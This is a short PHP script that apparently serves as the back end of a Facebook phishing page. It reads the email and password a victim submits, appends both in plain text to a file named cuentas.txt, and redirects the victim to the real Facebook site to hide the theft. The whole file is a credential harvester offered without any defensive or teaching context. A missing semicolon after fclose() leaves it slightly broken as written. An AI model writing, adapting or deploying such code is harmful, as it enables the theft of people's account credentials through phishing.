<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$fichero = fopen("cuentas.txt", "a");
fwrite($fichero, "$email".PHP_EOL);
fwrite($fichero, "$pass".PHP_EOL);
fclose($fichero)
header('location: https://www.facebook.com');
?>